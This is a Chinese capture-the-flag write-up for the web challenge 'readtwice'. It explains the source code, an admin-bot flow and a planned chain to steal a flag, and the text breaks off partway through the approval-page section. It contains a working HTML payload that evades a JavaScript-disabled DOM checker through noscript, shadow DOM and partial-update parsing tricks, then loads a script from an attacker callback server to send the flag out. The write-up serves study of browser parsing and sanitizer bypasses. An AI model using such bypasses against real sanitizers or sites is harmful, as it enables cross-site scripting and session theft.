# readtwice 题解与完整复现

| 项 | 值 |
|---|---|
| 比赛 | PwnSec CTF 2026 |
| 类别 | Web |
| 难度 | Hard |
| 分值 | 260 |
| 远程实例 | 已随比赛结束销毁，无法访问 |
| 本地 flag | `pwnsec{real_flag_on_remote}`（本地部署配置里的占位值） |
| 真实 flag | `pwnsec{1503fc99f750c466}` |
| 解题状态 | 比赛期间未独立解出；赛后根据公开题解在本地完整复现成功 |

> 名词说明：**flag** 指比赛的最终目标字符串（本题格式为 `pwnsec{...}`），拿到它代表解出本题。
>
> **CTF** 指 Capture The Flag，网络安全夺旗赛；类别 **Web** 指网页应用方向，难度档 **Hard** 对应"困难"。
>
> **机器人（bot）** 指题目内置的自动化无头浏览器：它持有管理员的登录会话（cookie），按固定流程执行审查；其中访问你提交的网址时不携带管理员 cookie。

阅读说明：本文按"先讲清系统与规则，再逐项解决四个问题，最后给出可复制的完整复现"组织。第二章是主章节，从部署开始按攻击发生的顺序推进；涉及浏览器机制（解析差异、影子 DOM、DPU、消息端口、Fetch Metadata、历史回退）时，在使用它们的段落就地解释，不要求提前理解。第三章起是速查、日志、脚本讲解、复现指南、防御与复盘，可单独查阅。

## 目录

- [一、这道题在做什么](#一这道题在做什么)
- [二、完整复现（从部署到拿到 flag）](#二完整复现从部署到拿到-flag)
- [三、速查与参考](#三速查与参考)
- [四、完整链复现日志](#四完整链复现日志)
- [五、攻击脚本逐段讲解](#五攻击脚本逐段讲解)
- [六、复现指南](#六复现指南)
- [七、防御建议](#七防御建议)
- [八、比赛过程复盘与改进方案](#八比赛过程复盘与改进方案)
- [附录](#附录)

---

## 一、这道题在做什么

题目是一个笔记系统。你可以创建笔记、预览笔记，也可以把任意网址提交给"审查员"检查。审查员是一个自动化无头浏览器（本文称"机器人"），它持有管理员的登录会话，并且可以读取 flag。它收到网址后会按固定流程访问，全过程不受提交者控制。

flag 在管理员专属接口 `/api/flag` 里，只有管理员会话能读到。你的目标：让一段自己写的 JavaScript 在机器人浏览器的挑战域（挑战域：题目服务器自身的网域，容器内为 `http://localhost:3000`）页面上执行，借它的管理员身份读走 flag。

系统的四个角色：

| 角色 | 说明 |
|---|---|
| 用户（你） | 创建笔记、提交网址；在服务器眼里没有任何特殊权限 |
| 服务器 | 网站程序，保存笔记、维护"当前审查任务"的状态、提供 `/api/flag` |
| 机器人 | 内置在服务器进程里的自动化浏览器，持有管理员会话，按固定流程执行审查 |
| 攻击者 | 你的目标身份：让机器人的浏览器替你把 flag 读出来 |

### 三条必须先记住的规则

1. **笔记要经过严格的格式检查**。`POST /create` 会把提交的 HTML（截取前 512 字符）交给无头浏览器，在**关闭 JavaScript、断网**的条件下解析一次并检查最终 DOM；不通过直接拒绝。检查要求见 2.2：在**检查器这一次解析**中，`head` 必须恰好一个 CSP meta 标签、`body` 恰好一个空 `div`（属性与文本另有约束）。该约束只作用于检查器这一次解析；保存的是提交的字符串本身，之后它会被重新解析渲染（`/sandbox` 一次、审查页第二次访问一次），且渲染结果可以与检查结果不同。2.6 的利用点即在此。
2. **机器人固定按顺序做五步**：登录管理员会话 → 访问审查页（第一次，只做标记）→ 访问 `/api/flag`（把 flag 缓存进本轮审查记录）→ 带机器人口令 `X-Bot-Token` 调用 `/reports/arm/:id`（把审查置为"已就位"）→ 访问你提交的网址并停留 10 秒。整个流程由同一个浏览器上下文执行（第 1 步在该上下文中建立管理员会话）；管理员会话只随发往应用主机（`localhost`）的请求发送，**发往你提交站点的请求不携带它**。
3. **审查页只在第二次访问时输出笔记原文，且该次响应不带任何 CSP 响应头**。审查页 `GET /reports/check` 第一次被访问时只设置一个"已访问"标记并返回占位页；第二次访问要通过全部检查，才会把笔记 HTML 原样输出。这个输出点就是整条攻击链的终点。

> 关于第 3 条的两点说明：
> - **CSP**（Content Security Policy，内容安全策略）：浏览器用来限制页面能加载和执行哪些内容的机制，通过 HTTP 响应头或页面内的 meta 标签下发。本题中，检查器要求每篇笔记自带一个 CSP meta 标签，声明 `default-src 'none'`（禁止一切外部资源），但第 3 条说的那个输出点，**既不带响应头 CSP，笔记自带 meta 的生效时机也晚于脚本执行**。机制在 2.6 展开。
> - "第二次访问"这个名字来自源码结构：`GET /reports/check` 的处理函数先判断 `currentReview.visited` 是否已为真，为真走"渲染分支"，为假走"标记分支"。这两个名字是本文对两段代码的称呼，源码中并没有它们。

### 攻击链概要

1. 准备一篇"检查时是空白文档、渲染时执行脚本"的笔记（2.6）；
2. 准备回调服务器并提供四个端点，把它的网址提交给机器人（2.5）；
3. 机器人访问期间：借它的浏览器打开审批页面，把审批状态置为"已批准"（2.7）；
4. 用浏览器历史回退制造一次满足 `Sec-Fetch-Site: none` 的导航，让审查页发生第二次访问并通过全部检查（2.8）；
5. 笔记原文在挑战域内被渲染，脚本再次执行，读取 flag 并发送到回调服务器（2.9）。

### 术语约定

本文对几个反复出现的名字做如下约定（其余专有名词见附录 B）：

| 名字 | 指什么 |
|---|---|
| 检查器 | `bot.js` 里的 `inspectDocument` 函数：创建笔记时的 DOM 检查 |
| 审查页 | 路由 `GET /reports/check` |
| 审批页面 | 路由 `GET /review`，内含沙箱 iframe 与"收到就绪信号后批准"的逻辑 |
| 沙箱页 | 路由 `GET /sandbox`，在 iframe 里渲染笔记原文（带 `sandbox allow-scripts` CSP） |
| 入口页 | 攻击者提交给机器人的那个网址所对应的页面（攻击者控制） |
| 回调服务器 | 攻击者自己控制的服务器，提供入口页、辅助页面、注入脚本与外传接收端点 |

---

## 二、完整复现（从部署到拿到 flag）

本章目标：从部署开始，按发生顺序走完整条攻击链，直到拿到 flag。涉及的浏览器机制都在用到它们的小节里就地解释，不要求提前理解。

### 2.1 部署

题目附件解压后是一份可构建的源码目录（文件清单见附录 A）。先看 `docker-compose.yml` 里的环境变量：

```yaml
environment:
  PORT: "3000"
  APP_URL: "http://localhost:3000"
  FLAG: "pwnsec{real_flag_on_remote}"
  BOT_TOKEN: "local-bot-token"
  SESSION_SECRET: "looosoosw"
```

| 变量 | 作用 |
|---|---|
| `FLAG` | 目标字符串本体，`/api/flag` 返回的就是它；本地是占位值，远程部署时替换为真实 flag |
| `BOT_TOKEN` | 机器人口令：`/reports/session` 与 `/reports/arm/:id` 两个接口会校验请求头 `X-Bot-Token`。攻击者不知道它 |
| `SESSION_SECRET` | 会话 cookie 的签名密钥，防止伪造会话；本地为固定测试值 |
| `PORT` / `APP_URL` | 服务监听端口；机器人访问服务所用的基地址（容器内视角） |

启动并验证：

```bash
cd readtwice
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200
```

> 端口说明：附件把宿主机端口 `3001` 映射到容器端口 `3000`（compose 里 `3001:3000`）。容器内的服务器和机器人把服务看作 `http://localhost:3000`。后文提到 `localhost:3000` 都是容器内视角；从宿主机访问用 `127.0.0.1:3001`。

### 2.2 笔记检查器的要求

创建笔记时，`/create` 会调用 `bot.js` 里的 `inspectDocument` 检查 HTML。检查过程是：**关闭 JavaScript、断网**，用 `page.setContent` 把 HTML 字符串直接交给无头浏览器渲染，然后检查最终 DOM：

```javascript
await page.setJavaScriptEnabled(false);   // 关闭 JavaScript：检查阶段不执行笔记中的脚本；解析规则随之变为"禁用脚本"模式（noscript 按标记解析，这是 2.6 的利用点之一）
await page.setOfflineMode(true);           // 断网：检查阶段不加载任何外部资源（笔记无法在检查时与外部通信）
await page.setContent(source, { waitUntil: "domcontentloaded", timeout: 5000 });   // 把 HTML 字符串直接写入页面：得到"笔记解析后的 DOM"供下面的判定读取（不经过网络加载）

// 应用场景：/create 创建笔记的判定环节（inspectDocument 的最后一步）。此时笔记已解析完成，此函数由 puppeteer 注入页面执行，不受上面"关闭 JavaScript"影响。
// 目的：判定这篇笔记能否入库（返回 true 才会保存），确保入库笔记只能是"一个 CSP meta + 一个空 div"的固定结构，防止夹带可执行内容。
// 功能：读取最终 DOM 逐条判定，全部条件成立返回 true，否则返回 false。
return await page.evaluate(() => {
  const declaration = document.head.firstElementChild;   // 取 head 的第一个元素：后面的判定要求它是 CSP meta
  const surface = document.body.firstElementChild;       // 取 body 的第一个元素：后面的判定要求它是空 div
  const attributeProfile = [                             // 属性白名单：每项 = [元素, 允许的属性名数组]，逐项检查；清单之外的属性（如 onerror 等事件属性）一律拒绝
    [document.documentElement, []], [document.head, []], [document.body, []],
    [declaration, ["http-equiv", "content"]], [surface, []],
  ].every(([el, allowed]) =>
    el && el.getAttributeNames().every(name => allowed.includes(name)));

  // 七项判定（全部成立才返回 true）：
  return document.doctype?.name === "html"               // 有 doctype 且名称为 html
    && document.head.childElementCount === 1             // head 恰好 1 个元素
    && declaration?.localName === "meta"                 // 且必须是 meta
    && declaration.httpEquiv.toLowerCase() === "content-security-policy"   // 且 http-equiv 为 content-security-policy
    && declaration.content === "default-src 'none'"      // 且 content 逐字符相等
    && document.body.childElementCount === 1             // body 恰好 1 个元素
    && surface?.localName === "div"                      // 且必须是 div
    && surface.childElementCount === 0                   // 且 div 没有子元素
    && document.body.textContent.trim() === ""           // body 文本 trim 后为空
    && attributeProfile;
});
```

逐项拆开：

| # | 要求 | 说明 |
|---|---|---|
| 1 | 有 doctype，且名称为 `html` | `<!doctype html>` |
| 2 | `head` 恰好 1 个**元素** | 注释、文本、处理指令不算元素，不参与计数 |
| 3 | 该元素是 `meta`，`http-equiv` 为 `content-security-policy`，`content` 为 `default-src 'none'` | 即笔记必须自带一条 CSP 声明 |
| 4 | `body` 恰好 1 个**元素** | 同上，非元素节点不算 |
| 5 | 该元素是 `div`，且没有子元素 | `div` 必须是空的 |
| 6 | `body` 里的全部文本（去掉首尾空白后）为空 | 文本只能是空白字符 |
| 7 | 属性白名单：`html`/`head`/`body`/`div` 不允许有任何属性；`meta` 只允许 `http-equiv` 和 `content` | 防止用事件属性（如 `onload`）夹带代码 |

对照检查器视角，一篇合法的笔记长这样：

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div></div></body></html>
```

这只是合法形态的一例，不是唯一形态。判定标准是上面七项条件全部成立，而不是与示例逐字相同；2.6 的攻击 payload 与它源码完全不同，但检查器解析出的元素结构一致，同样通过检查。更多示例与通过原因见 2.2.1。

用 curl 创建并确认通过（通过会 302 到预览页）：

```bash
curl -si http://127.0.0.1:3001/create \
  -d 'title=t' \
  --data-urlencode 'html=<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src '"'"'none'"'"'"></head><body><div></div></body></html>' \
  | head -3
# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
```

这个检查的直接后果：**检查器只约束它计数的结构**：`head`/`body` 的元素数量、`meta` 与 `div` 的属性、`body` 的文本；注释、处理指令、声明式影子树的内容不在计数范围内，不受这些约束。检查用的三个设置（JavaScript 关闭、离线、字符串直投）在 2.6 是绕过检查的突破口，先记住它们。

#### 2.2.1 更多合法示例与通过原因

下面五个示例形态各不相同，全部能通过检查器；每例之后说明它为什么能通过（判定依据都是上面的七项条件）。

**例 1：省略隐含标签**

```html
<!doctype html><meta http-equiv="content-security-policy" content="default-src 'none'"><div></div>
```

HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 进入 body。检查器看到的结构与最小示例完全相同，因此七项条件全部成立。

**例 2：注释与空白文本**

```html
<!doctype html><html><head><!-- 说明 --><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><!-- 占位 --><div></div> </body></html>
```

注释和空白文本不是元素，不参与任何计数：head 的元素仍是 1 个（meta），body 的元素仍是 1 个（div），body 的全部文本去掉空白后为空。七项条件全部成立。

**例 3：meta 由 DPU 从文档末尾搬进 head**

```html
<!doctype html><head><?marker name="c"></head><div></div><template for=c><meta http-equiv="content-security-policy" content="default-src 'none'"></template>
```

检查在整份文档解析完成之后执行；此时 DPU 已把末尾 template 里的 meta 搬进 head，而 `<?marker>` 是处理指令，不是元素，不参与计数。最终元素结构与最小示例相同，七项条件全部成立。

**例 4：用声明式影子树藏起其他元素**

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><p>影子内容</p></template></div></body></html>
```

带 `shadowrootmode` 的 template 会被解析器消费：内容整体进入挂在 div 上的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。七项条件全部成立。

**例 5：影子树里放脚本（攻击形态的检查器视角）**

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><script src=https://回调服务器/s.js></script></template></div></body></html>
```

机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（JavaScript 关闭），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行。这就是 2.6 攻击 payload 能通过检查的原理。

以上五个示例均已提交给真实检查器实测（`/create` 全部返回 302；未通过检查的笔记会返回 400）。

### 2.3 机器人的完整流程

机器人端入口是 `bot.js` 的 `review()`。按源码顺序，它做这些事：

```javascript
const context = await browser.createBrowserContext();     // 为本次审查创建独立浏览器上下文：其下所有页面共享同一份 cookie（步骤 1 建立的管理员会话供后续步骤共用）

// 步骤 1：登录管理员会话
const sessionPage = await context.newPage();
await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });   // 给该页面的请求附加机器人口令头（服务端凭它建立管理员会话）
await sessionPage.goto(`${APP_URL}/reports/session`);
await sessionPage.close();

// 步骤 2+3：审查页第一次访问（标记），再读 flag 进内存
const setupPage = await context.newPage();
await setupPage.goto(`${APP_URL}/reports/check?rid=${report.id}`);
await setupPage.goto(`${APP_URL}/api/flag`);
await setupPage.close();

// 步骤 4：服务器进程内部（不经过浏览器）调用就绪接口
await fetch(`${APP_URL}/reports/arm/${report.id}`, {
  method: "POST", headers: { "X-Bot-Token": BOT_TOKEN },
});

// 步骤 5：访问提交的网址，并监听它的主导航
const page = await context.newPage();
const url = new URL(report.url);
url.searchParams.set("rid", report.id);       // 在提交的网址后追加 rid 参数（本轮编号会出现在页面地址里，供后续利用读取）
watchDocument(page, report, url.href);        // 启动主窗口导航监听（定义在 bot.js）：逐次记录主窗口导航以判定 finalized 状态（规则见下文）
await page.goto(url.href);
await sleep(10000);                            // 停留 10 秒：给提交的页面留出执行窗口（攻击链在此期间完成，见 2.10）
await page.close();
```

五个步骤与它们对状态的影响：

| 步骤 | 动作 | 状态变化 |
|---|---|---|
| 1 | 访问 `/reports/session`（带机器人口令） | 服务器给这个浏览器发管理员会话 cookie |
| 2 | 访问审查页 | `visited = true`（第一次访问，返回占位页） |
| 3 | 访问 `/api/flag` | flag 被存进本轮审查记录 `currentReview.flag` |
| 4 | 调用 `/reports/arm/<编号>` | `prepared = true` |
| 5 | 访问提交网址，停留 10 秒 | 攻击链发生在这一步内 |

步骤 5 中的 `watchDocument` 是机器人对"提交网址页面"的导航监听，规则有三条：

1. 只统计主窗口（`page.mainFrame`）的**导航请求**（打开新文档的请求）；
2. 第一个导航必须是你提交的网址（记作"入口"），否则记为"偏离"（`diverged = true`）；
3. 此后每次导航：如果目标是 `http://localhost:3000/reports/check?rid=<本轮编号>`（本文称"命中审查页"），就设置 `finalized = approved && !diverged`；如果去了入口之外的其它网址（不含 `about:blank` 这类不产生网络请求的导航），就设置 `diverged = true`。

> 记住第 3 条：`finalized` 是在"命中的那次导航请求发出时"设置的。也就是说，**让机器人主窗口导航到审查页这件事本身，就是设置 `finalized` 的手段**。这是 2.8 的基础。

### 2.4 审查页的两次访问（攻击目标）

审查页 `/reports/check` 的完整源码结构如下（注释标出每项检查）：

```javascript
app.get("/reports/check", (req, res) => {
  res.setHeader("Cache-Control", "no-store");

  if (!req.session.admin) { /* 403 forbidden */ }              // 检查 1：管理员会话
  const id = String(req.query.rid || "");
  if (!currentReview || currentReview.id !== id) { /* 404 */ } // 检查 2：rid 匹配

  if (currentReview.visited) {
    // ===== 渲染分支（第二次访问）=====
    const note = notes.get(currentReview.noteId);
    if (!note) { /* 404 not found */ }                         // 检查 3：笔记存在
    if (!policy(req) || !consumeReport(req)) { /* 403 */ }     // 检查 4-8
    res.type("html").send(note.html);                          // 输出笔记原文；注意：没有 CSP 响应头
    return;
  }

  // ===== 标记分支（第一次访问）=====
  currentReview.visited = true;
  res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
});
```

检查 4 单独展开（`policy`）：

```javascript
function policy(req) {
  return Object.entries({
    "sec-fetch-site": "none",        // 要求：请求由浏览器发起（没有页面来源）
    "sec-fetch-dest": "document",    // 要求：目标是顶层文档导航
  }).every(([header, expected]) => req.get(header) === expected);
}
```

检查 5-8 展开（`consumeReport` 内的四个状态位）：

```javascript
if (!currentReview
    || currentReview.id !== id          // 再次确认 rid
    || !currentReview.prepared          // 检查 5：机器人已就位
    || !currentReview.approved          // 检查 6：审查已批准
    || !currentReview.finalized         // 检查 7：主窗口导航已命中审查页
    || currentReview.used)              // 检查 8：尚未被消费
  return false;
currentReview.used = true;              // 全部通过：立即置"已消费"，同一轮只输出一次
```

把第二次访问要过的全部检查列成清单（这就是攻击链要逐项满足的目标）：

| # | 检查项 | 来源 | 谁满足 |
|---|---|---|---|
| 1 | 管理员会话 | 请求必须携带机器人登录后的会话 cookie | 机器人：但请求必须由它发出 |
| 2 | rid 匹配 | 网址里的 `rid` 等于本轮审查编号 | 机器人自动追加；攻击者可从自己页面读到 |
| 3 | 笔记存在 | 本轮绑定了一篇存在的笔记 | 攻击者自己准备 |
| 4 | `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 需要"由浏览器发起"的顶层导航，攻击者要制造（2.8） |
| 5 | `prepared` | 机器人步骤 4 已执行 | 机器人自动完成 |
| 6 | `approved` | 有人成功调用过 `/complete` | 攻击者要制造（2.7） |
| 7 | `finalized` | 主窗口导航命中过审查页 | 攻击者要制造（2.8） |
| 8 | `!used` | 尚未被消费 | 自动，前七项过了自然满足 |

`approved` 的置位接口 `/complete` 源码：

```javascript
app.post("/complete", (req, res) => {
  const id = String(req.body.id || "");
  const state = String(req.body.state || "");
  if (currentReview && currentReview.id === id
      && currentReview.prepared
      && req.session.admin
      && state === currentReview.nonce) {   // 四项全对才置位
    currentReview.approved = true;
  }
  res.type("text/plain").send("ok");
});
```

其中 `nonce` 是服务器在每轮审查开始时随机生成、绑定在本轮记录上的值；审批页面会把它打印在自己的页面里（2.7）。

到这里，攻击的四个问题也就清楚了：

1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）；
2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里；
3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页；同时这次导航还要落进 `watchDocument` 的规则第 3 条来设置 `finalized`；
4. **外传问题**：flag 进了页面之后怎么送出来。

2.6 到 2.9 依次解决。

### 2.5 回调服务器准备

攻击者需要一个机器人**能访问到**的服务器。本地复现时它跑在宿主机上，容器通过 `http://host.docker.internal:8000` 访问（`host.docker.internal` 是 Docker 提供的一个特殊域名，指向宿主机）；远程做题时需要一个公网可达的地址（例如公共 webhook 服务或自己的 VPS）。它提供四个端点：

| 路由 | 第一次响应 | 第二次响应 | 作用 |
|---|---|---|---|
| `/`（带 `?note=` 参数） | 一段带 JavaScript 的 HTML | 302 重定向到 `http://localhost:3000/reports/check?rid=<rid>` | 入口页；第二次访问时把机器人送往审查页（2.8） |
| `/helper` | 一段带 JavaScript 的 HTML | 无 | 对入口页执行历史回退（2.8） |
| `/s.js` | JavaScript 代码 | 无 | 注入笔记中的脚本（双分支，2.6/2.9） |
| `/flag?x=<base64>` | 无 | 无 | 接收外传的 flag（2.9） |

`/` 和 `/s.js` 的具体内容在对应小节逐段给出。所有响应都带 `Cache-Control: no-store`（入口页这一条在 2.8 会用到）。

### 2.6 问题一：让笔记在渲染时执行脚本

> 一句话说明：2.2 的检查器与真正的浏览器读取的是同一份字符串，但两者环境不同：检查器关闭 JavaScript，浏览器开启。HTML 解析器在两种 JavaScript 开关下会产生不同结果；利用这一点，可以做出"检查时是空白文档、渲染时包含可执行脚本"的笔记。

#### 2.6.1 两个环境的三个差异点

| 维度 | 检查器（`inspectDocument`） | 渲染端（浏览器打开 `/sandbox` 或审查页） |
|---|---|---|
| JavaScript | 关闭 | 开启 |
| 网络 | 离线 | 在线 |
| HTML 的传递方式 | `page.setContent(字符串)` | 真实 HTTP 响应体 |

差异点的来源是三个 HTML 规范行为：

1. **`<noscript>` 的两种解析模式**：JS 关闭时按普通标签解析其内容，JS 开启时按"原始文本"解析（只找结束标记 `</noscript>`）。同一段字符串因此可以产出两棵不同的 DOM；
2. **声明式 Shadow DOM**：`<template shadowrootmode=...>` 会被解析器"消费"：内容进入影子树，template 标签本身不进入文档树、内容不计入父元素的子元素数量；
3. **DPU 声明式部分更新**（Declarative Partial Updates，2026 年 5 月公告的 HTML 新特性）：`<?marker name=...>` 处理指令与 `<template for=...>` 配对，可以**在文档解析到该 template 时才把内容搬运到 marker 的位置**。

下面逐个说明，它们各自的作用在 2.6.5 组装 payload 时会合起来。

#### 2.6.2 机制一：`<noscript>` 的两种解析模式

HTML 解析器里有一个"脚本开关"（是否启用 JavaScript）。`<noscript>` 的内容如何解析完全取决于它：

- **JS 关闭**：`<noscript>` 内容被当作正常标记解析，里面的标签会成为真实元素；
- **JS 开启**：`<noscript>` 内容被当作原始文本，解析器不做标签解析，只查找字符串 `</noscript>` 来结束这一段。

用一个最小例子对照（这段 HTML 本身不会通过 2.2 的检查，仅用于演示机制）：

```html
<noscript><a alt="</noscript><script>alert(1)</script>">x</a></noscript>
```

| JavaScript 状态 | 解析过程 | 结果 DOM |
|---|---|---|
| 关闭 | `<a` 开始标签的 `alt` 属性值为引号内的整段文本 `</noscript><script>alert(1)</script>`；引号内不会解析出任何标签 | 只有 `<a>` 元素；**没有** script 元素 |
| 开启 | 原始文本模式只查找 `</noscript>`，它在 `alt` 属性值的**内部**就第一个命中，noscript 在此提前结束；后续的 `<script>alert(1)</script>` 成为真实元素 | 存在 script 元素，**会执行** |

关键点：**同一段文本，在 JS 关闭时被视为属性值的一部分（不产生元素），在 JS 开启时则成为真实标签**。这就是"检查器通过、渲染器执行"两种结果的来源。

#### 2.6.3 机制二：声明式 Shadow DOM

普通影子树要用 JavaScript 调用 `element.attachShadow()` 创建；声明式写法只用 HTML：

```html
<div><template shadowrootmode=open><p>影子内容</p></template></div>
```

解析器遇到带 `shadowrootmode` 属性的 `<template>` 时：

1. 在父元素（这里是 `div`）上创建一个影子根（shadow root）；
2. 把 `<template>` 的内容放入影子树；
3. **`<template>` 元素本身不进入文档树**。

对检查器的三个直接效果：

- 影子树里的元素**不计入**父元素的 `childElementCount`（对检查器来说 `div` 看起来是空的）；
- 影子树里的文本**不计入** `document.body.textContent`；
- 上述两条对检查器使用的 `page.evaluate` 中的任何 DOM 查询都成立。

版本信息：Chrome 90（2021 年，旧属性名 `shadowroot`）首次支持；Chrome 111（2023 年 3 月）改为现行属性名 `shadowrootmode`；Chrome 124（2024 年）完成标准化。本题容器内是 Chromium 152，全部支持。

#### 2.6.4 机制三：DPU 声明式部分更新

DPU 是 2026 年 5 月 19 日发布的 HTML 新提案（Chrome 官方博客《Declarative partial updates》），用两条语法完成"内容搬运"：

```html
<div><?marker name="c"></div>
...
<template for=c><b>后到的内容</b></template>
```

解析完成后 `div` 里是 `<b>后到的内容</b>`。两条规则：

1. `<?marker name="c">` 是**处理指令节点**（Processing Instruction）：它**不是元素**，不占 `childElementCount`、不计入元素查询；
2. 解析器读到 `<template for=c>` 时，才把它的内容搬入 marker 的位置（marker 被搬入的内容替换）；**template 本身不进入文档树**。

对检查器的两个直接效果：

- 放在文档**末尾**的 `<template for=...>` 里的元素，会出现在文档**前面**的 marker 位置（比如 `head` 里）；
- 搬运发生在**解析到末尾那条 template 的时刻**。在此之前，那个位置是空的。也就是说，可以让检查器最终看到"head 里恰好有一个 meta"，同时让这个 meta 在解析过程中的大部分时间里都不存在。

版本信息：Chrome 官方博客（2026 年 5 月 19 日发布，9 月 8 日更新）中的支持表为：`<?marker>`/`<template for>` 自 Chrome 150 起支持，Firefox 与 Safari 尚未支持。本题容器内是 Chromium 152，已包含该特性，实测直接生效。以目标环境实测为准，不要只凭版本号判断。

> 三个机制的分工可以先记成一句话：**noscript 决定"什么内容会变成标签"，影子 DOM 决定"检查器统计不到哪些元素"，DPU 决定"元素什么时候出现在目标位置"**。下一节把它们组合成完整 payload。

#### 2.6.5 payload 组装：一份输入、两个视角

完整的笔记 HTML（做成一行，就是提交给 `/create` 的内容；把 `https://回调服务器` 替换成你自己的地址）：

```html
<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://回调服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
```

先看它的结构，共五个部分：

| 部分 | 内容 | 作用 |
|---|---|---|
| A | `<head><?marker name="c"></head>` | 在 head 里放一个 DPU 占位标记 |
| B | `<div><template shadowrootmode=open>...</template></div>` | 用一个声明式影子树包住所有"危险元素"，使检查器统计不到它们 |
| C | `<noscript><a alt="`…`">x</a></noscript>` | 靠 noscript 的双模式在两种环境下产出不同结果 |
| D | `<script src=.../s.js></script>` | 由 C 包裹的脚本本体（检查时是属性值文本、渲染时是元素） |
| E | `<template for=c><meta ...></template>`（文档末尾） | 用 DPU 把 CSP meta 在解析末尾搬进 head |

**检查器视角（JavaScript 关闭）逐步推演**：

1. `<!doctype html>` → doctype 名称为 `html` ✓；
2. `<head>` 开始；
3. `<?marker name="c">` → 处理指令节点（**不是元素**，不计数）；此时 head 里还没有 meta；
4. `</head>`；
5. `<div>` → body 隐式创建，div 进入 body；
6. `<template shadowrootmode=open>` → div 上创建影子根，template 内容全部进入影子树；template 元素本身不进文档树；
7. `<noscript>` → JS 关闭：内容按普通标记解析；
8. `<a alt="` → `alt` 属性值吸收引号内的整段文本 `</noscript></template><script src=...></script>`；**这段文本不产生任何元素**（那个 script 只是字符串）；生成的 `<a>` 元素位于影子树内部；
9. `">x</a>` → `<a>` 闭合（影子树内部）；随后 `</noscript>` 闭合 noscript（影子树内部）；
10. `</template>` → 影子根内容插入结束；
11. `</div>` → div 闭合；**div 的普通子元素数量为 0**（步骤 6-10 的内容都在影子树里）；
12. `<template for=c>` → DPU 搬运：meta 被放入 head 中 marker 的位置；template 本身不进文档树；
13. 解析结束。检查器看到的最终 DOM：`head` 里只有 meta 一个元素（marker 的位置被搬入的内容替换；元素计数 1），`body` = [div]（元素计数 1），div 子元素 0，body 文本只含空白，全部元素无多余属性 → **七项检查全过** ✓。

**渲染器视角（JavaScript 开启）逐步推演**：

1. 到步骤 6 为止与上面相同（div + 影子根已创建）；
2. `<noscript>` → JS 开启：原始文本模式，解析器只查找 `</noscript>`；
3. 第一个 `</noscript>` 出现在 `alt` 引号内部（字符串 `<a alt="` 之后）→ noscript 在此提前闭合；影子树里的 noscript 内容只是文本 `<a alt="`；
4. `</template>` → 影子根内容插入结束；
5. `<script src=.../s.js>` → **成为真实元素**（插入 div 的普通子树）；外部脚本是"解析阻塞"的，浏览器会立即加载并执行它；
6. **执行时刻的关键**：此时文档还没解析到步骤 8 的末尾 template，**head 里还没有 meta，页面没有任何 CSP 生效**，脚本顺利加载运行；`/sandbox` 的响应头 CSP 为 `sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'`，里面没有 `script-src` 一类限制脚本加载的指令，也不会拦它；
7. `">x</a>` 等剩余字符 → 成为 div 里的文本或多余闭合标签，无影响；
8. `<template for=c>` → meta 这时才被搬进 head。CSP 只对生效之后的资源加载起作用，而脚本已经执行完毕。

两个视角对照：

| 检查项 | 检查器视角 | 渲染器视角 |
|---|---|---|
| head 元素数 | 1（meta，被 DPU 搬入） | 1（meta，但直到解析末尾才出现） |
| body 元素数 | 1（div） | 1（div） |
| div 子元素 | 0（内容在影子树） | 脚本元素是真实存在的 |
| script 元素 | 不存在（只是 alt 属性值里的字符串） | 存在并执行 |
| 执行时 CSP | 不涉及 | 尚未生效（meta 还没进 head） |

#### 2.6.6 本地验证脚本确实在渲染时执行

机器人不会主动打开审批页面，因此默认流程里不会发生笔记的解析渲染（脚本不会执行）；要单独验证脚本能执行，需要把机器人引到 `/review`，由沙箱 iframe 加载笔记。步骤：

1. 把回调服务器的 `/s.js` 临时改为一行代码 `fetch('https://回调服务器/hit')`，并加一个记录日志的 `/hit` 路由；
2. 提交 `/report`，网址填 `http://localhost:3000/review?note=<笔记编号>`（机器人会追加 `rid`；机器人浏览器自带管理员会话，`prepared` 也已就位，沙箱可以正常加载笔记），或直接运行第五章的完整脚本走到阶段二；
3. 回调服务器收到 `/hit` 请求，即证明脚本在沙箱渲染时执行；验证后把 `/s.js` 改回正式内容（第五章）。

### 2.7 问题二：让审批页面调用 /complete

> 一句话说明：`/complete` 需要管理员会话、正确的 `id` 和 `state`（`state` 就是每轮随机的 `nonce`）。攻击者一样都没有；但置位并不需要攻击者拥有它们：审批页面（`/review`）自身就带着管理员会话，它的页面脚本里也印着 `id` 和 `state`。审批页面的逻辑是"收到就绪信号即批准"，攻击者只需要让这个信号出现。

#### 2.7.1 审批页面的源码与通信协议

`/review` 路由（服务器端）在 `rid` 匹配时渲染审批页面模板。模板里与攻击相关的部分：

```html
<iframe id="viewer" sandbox="allow-scripts"
        src="/sandbox?rid=<%= encodeURIComponent(id) %>"></iframe>
<script nonce="<%= nonce %>">
  const viewer = document.getElementById("viewer");
